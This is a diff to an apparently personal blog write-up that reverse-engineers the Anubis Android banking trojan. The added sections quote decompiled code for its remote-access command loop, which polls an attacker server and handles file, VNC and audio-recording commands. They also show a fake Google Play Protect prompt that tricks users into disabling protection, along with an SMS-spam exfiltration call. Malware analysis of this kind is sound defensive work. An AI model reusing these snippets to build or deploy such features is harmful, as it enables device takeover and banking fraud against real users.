@@ -336,7 +336,7 @@ if (Java.available) {
 the result was empty, which implies that the malware is not loading classes at runtime.
 From which i assume that this malware is not packed.
 
-### Diving deep
+## Going Down the Rabbit Hole
 
 Since we have idenitified the MainActivity and some other useful classes using the manifest, we know where to start. We'll start with the MainActivity (obiviously) and move into other stuff we idenitified.
 
@@ -1485,7 +1485,182 @@ if it does, it replaces the name with an empty string and append the name to the
 
 here is the list of applications that anubis targets.
 
-Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at some other features mentioned in the shared preference xml and manifest xml.
+
+### Remote Access
+
+We already know anubis has RAT capabilities. And those features are implemented in the below class.
+
+```java
+/* renamed from: wocwvy.czyxoxmbauu.slsa.xelytgswelv */
+public class RAT extends IntentService {
+
+    /* renamed from: a */
+    String str = "";
+
+    /* renamed from: b */
+    SomeHttpClass cls = new SomeHttpClass();
+
+    /* renamed from: c */
+    Constants consts = new Constants();
+
+    /* renamed from: d */
+    HttpConn conn = new HttpConn();
+
+    /* renamed from: e */
+    BankingApps banking_apps = new BankingApps();
+
+    public RAT() {
+        super("xelytgswelv");
+    }
+```
+
+here it initializes some objects. Interesting part begins in the `onHandleIntent` 
+Since this is an IntentService, onHandleIntent is the first method that will get executed. quoting android api reference
+
+**"This method is invoked on the worker thread with a request to process. Only one Intent is processed at a time, but the processing happens on a worker thread that runs independently from other application logic"**
+
+```java
+
+    public void onHandleIntent(Intent intent) {
+
+        [... more code]
+
+        this.str = this.cls.GetSSAID(this).replace(" ", "");
+
+        [... more code]
+```
+
+`str` is assigned to `SomeHttpClass.GetSSAID` but with spaces are strippd off.
+
+```java
+        while (true) {
+            TimeUnit.MILLISECONDS.sleep(1000);
+            String e = this.cls.GetSharedPreference(this, "websocket");
+```
+
+then a inside an infinite loop, it sleeps for 1000 miliseconds and assign string `e` with shared preference `websocket`.
+
+```java
+            if (!e.equals("")) {
+                HttpConn bVar3 = this.conn;
+                StringBuilder sb = new StringBuilder();
+                sb.append(e);
+                this.consts.getClass();
+                sb.append("/o1o/a2.php");
+                String sb2 = sb.toString();
+                StringBuilder sb3 = new StringBuilder();
+                sb3.append("tuk_tuk=");
+                sb3.append(this.cls.Encode(this.str + "|:| "));
+                String d = this.cls.DecodeAndDecrypt(bVar3.PostRequest(sb2, sb3.toString()));
+                this.cls.mo213a("RATresponce", "" + d);
+```
+
+if `e` is not an empty string, it then creates a string builder and append `e` to it and in the next line it appends `"/o1o/a2.php"` to it. Since we have previously encountered `websocket`, we know its the domain name/ip address of the server.
+
+In the next few lines, it is pretty clear that method is creating POST request to a url using the string builder `sb`. it is then assigned to the string `sb2` and another string builder named `sb3` is created. I beleive this is what `PostRequest` implemented in `HttpConn` class writes to the **output stream of the http connection**.  
+
+then the returning response of the request is base64 decoded and decrypted and assigned to string `d`.
+
+```java
+                if (d != "**") {
+                    if (d.contains("opendir:")) {
+                        String str6 = d.replace("opendir:", "").split("!!!!")[0];
+                        if (str6.contains("getExternalStorageDirectory")) {
+                            str6 = Environment.getExternalStorageDirectory().getAbsolutePath();
+                        }
+
+                        [... more code]
+
+                    } else if (d.contains("downloadfile:")) {
+                        String str7 = d.replace("downloadfile:", "").split("!!!!")[0];
+                        this.cls.mo213a("file", str7);
+
+                        [... more code]
+
+                    } else if (d.contains("deletefilefolder:")) {
+                        File file = new File(d.replace("deletefilefolder:", "").split("!!!!")[0]);
+                        file.delete();
+
+                        [... more code]
+
+                    } else if (!d.contains("startscreenVNC")) {
+                        
+                        [... more code; look below]
+                        
+
+                    } 
+                    // if d.contains("startscreenVNC") == true
+                    else if (!this.cls.IsRunning(this, IntentServiceC0104x3750d9a6.class)) {
+                        
+                        [... more code]
+
+                    }
+                    bVar.mo213a(str2, str);
+                }
+```
+first it makes sure `d` is not equal to `"**"`, which might be a termination command.
+In the next few lines of the method, it checks whether if response string contains various commands such as,
+
+    - opendir
+    - downloadfile
+    - deletefilefolder
+    - startscreenVNC
+
+These must be the remote access commands that malware uses.
+
+However there are many other commands under mentioned inside the else if block that checks if `d` does not contain string `"startscreenVNC"`.
+
+```java
+                        if (d.contains("stopscreenVNC")) {
+                            bVar2 = this.cls;
+                            str3 = "vnc";
+                        } else {
+                            if (d.contains("startsound")) {
+                                if (this.cls.mo229c(this, this.banking_apps.record_audio_permission[0])) {
+                                    
+                                    [... more code]
+
+                                }
+                            } else if (d.contains("startforegroundsound")) {
+                                if (this.cls.mo229c(this, this.banking_apps.record_audio_permission[0])) {
+                                    
+                                    [... more code]
+                                }
+                            } else if (d.contains("stopsound")) {
+                                bVar2 = this.cls;
+                                str3 = "sound";
+
+                            } else if (d.contains("**noconnection**")) {
+                                this.cls.SetSharedPreference(this, "websocket", "");
+                                this.cls.SetSharedPreference(this, "vnc", "stop");
+                                this.cls.SetSharedPreference(this, "sound", "stop");
+                                stopService(intent);
+                            }
+                            startService(intent2.putExtra(str4, str5));
+                        }
+                        bVar2.SetSharedPreference(this, str3, "stop");
+```
+
+As we saw earlier it checks if `d` does not contain the string `"startscreenVNC"`. if true, it checks if `d` contains following strings, which are essentially, RAT commands
+
+    - stopscreenVNC
+    - startsound
+    - startforegroundsound
+    - stopsound
+    - **noconnection**
+
+what each of these (as well as the previous ones) commands does is pretty much clear. Since we have already analyzed audio recording functions, it is clear that `startsound` and `startforegroundsound` are the commands that invoke those functions (by setting shared preference `"sound"` to `start`,`start foreground`) and `stopsound` is the one that stops recording (by setting `"sound"` to `stop`).
+
+if the response string contains `**noconnection**` in it,  if so, it sets following shared preferences
+
+    - websocket -> ""
+    - vnc -> "stop"
+    - sound -> "stop"
+
+and stops the service. it also sets whatever shared preference at `str3` to `"stop"`, and `str3` should be either `"vnc"` or `"sound"`.
+It seems like after diconnecting with the attacker, it resets all the associated shared preferences.
+
+**Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at some other features mentioned in the shared preference xml and manifest xml.**
 
 ### Achieving Persistance and User Presence
 
@@ -1676,10 +1851,6 @@ public class SMSSpam extends IntentService {
             }
 ```
 
-Since this is an IntentService, onHandleIntent is the first method that will get executed. quoting android api reference
-
-**"This method is invoked on the worker thread with a request to process. Only one Intent is processed at a time, but the processing happens on a worker thread that runs independently from other application logic"**
-
 it looks like the method tries to sleep for 10000 miliseconds inside an infinite loop. if it fails, it prints the stack trace.
 
 ```java
@@ -1716,7 +1887,7 @@ from that we can conclude if `GetSharedPreference("indexSMSSPAM")` results in `|
                     StringBuilder sb2 = new StringBuilder();
                     sb2.append("p=");
                     sb2.append(this.cls.Encode("getnumber" + this.str));
-                    String d = this.cls.EncodeAndEncrypt(bVar2.exfiltrate(this, "15", sb2.toString()));
+                    String d = this.cls.DecodeAndDecrypt(bVar2.exfiltrate(this, "15", sb2.toString()));
                     String str = "";
                     String e2 = this.cls.GetSharedPreference(this, "textSPAM");
 ```
@@ -1891,6 +2062,83 @@ It also sets shared preference value for `getNumber to true`.
 
 This service also implements a method that sends an SMS to every contact number with SMS body being the SSAID of the device.
 
+### Say No to google play protect 
+
+When we were reversing the shared preferences, we saw that the malware is capable of disabling google play protect. but it is initially disabled. Since we already know `Service1`, which was invoked by `MainActivity` is responsible for enabling and disabling shared preferences, we can take a look aat that.
+
+```java
+                                if (new File(dir2, sb4.toString()).exists()) {
+                                    try {
+                                        if (this.cls.GetSharedPreference(this, "play_protect").equals("true")) {
+                                            Intent intent3 = new Intent(this, DisplayGooglePlayProtect.class);
+                                            intent3.addFlags(268435456);
+                                            intent3.addFlags(1073741824);
+                                            startActivity(intent3);
+                                        }
+                                    } catch (Exception unused5) {
+                                        this.cls.mo213a("jtfxlnc", "ERROR getProtect");
+                                    }
+```
+See?, it cheks if some file or directory exists and calls `GetSharedPreference(this, "play_protect")`. if the result is equal to true, 
+if creates another activity, named `DisplayGooglePlayProtect`.
+
+let's focus on that.
+
+```java
+public class DisplayGooglePlayProtect extends Activity {
+
+    [... more code]
+
+    /* access modifiers changed from: protected */
+    public void onCreate(Bundle bundle) {
+        String str;
+        String str2;
+        super.onCreate(bundle);
+        this.ctx = this;
+        try {
+            str = this.cls.GetSharedPreference(this, "textPlayProtect");
+            try {
+                str2 = this.cls.GetSharedPreference(this, "buttonPlayProtect");
+            } catch (Exception unused) {
+            }
+
+        [... more code]
+```
+
+inside the try block, `onCreate` method calls `GetSharedPreference(this, "textPlayProtect")` and assigns returning string to `str`. inside another nested try block, it calls `GetSharedPreference(this, "buttonPlayProtect")` and assigns return string to `str2`.
+
+it looks like those keys refer to some strings that used when asking for permissions.
+
+```xml
+<string name="textPlayProtect">The system does not work correctly, disable Google Play Protect!</string>
+<string name="buttonPlayProtect">Сontinue</string>
+```
+
+```java
+        AlertDialog.Builder builder2 = new AlertDialog.Builder(this);
+        builder2.setTitle("Google Play Protect").setMessage(str).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str2, new DialogInterface.OnClickListener() {
+            /* class wocwvy.p003x881dce2d.slsa.ncec.ActivityC0062x231814f.DialogInterface$OnClickListenerC00631 */
+
+            public void onClick(DialogInterface dialogInterface, int i) {
+                Intent intent = new Intent();
+                intent.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
+                try {
+                    DisplayGooglePlayProtect.this.startActivity(intent);
+                    DisplayGooglePlayProtect.this.ctx.startService(new Intent(DisplayGooglePlayProtect.this.ctx, ServiceC0111x5ad12ef2.class));
+                } catch (ActivityNotFoundException unused) {
+                    DisplayGooglePlayProtect.this.cls.mo213a("ERROR", "ActPlayProtect");
+                }
+                dialogInterface.cancel();
+            }
+        });
+        try {
+            builder2.create().show();
+        } catch (Exception unused3) {
+        }
+```
+
+here, it uses previously retreived values to create an `AlertBuilder` that requests permission to disable google play protect.
+
 ### Ransomware capabilities
 
 We saw it in the manifest that anubis has ransomware capabilities.
@@ -2007,6 +2255,8 @@ We can conclude that this method is the on in charge for encrypting and decrypti
 
 ### the end
 
-Wow this. this is the longest article I have erver wrteen. So eayh
+This is the longest article I have ever typed. hell its over 2000 lines. So eayh, we started analysis with 0 knowledge on a random malware and dissected various part of it using both dynamic and static analysis techniques to understand what it is capable of doing.  
+
+with our understanding about the malware, we can conclude that anubis is a very sophisticated banking trojan, that is capable of many things. 
 
 #Speard anarchy
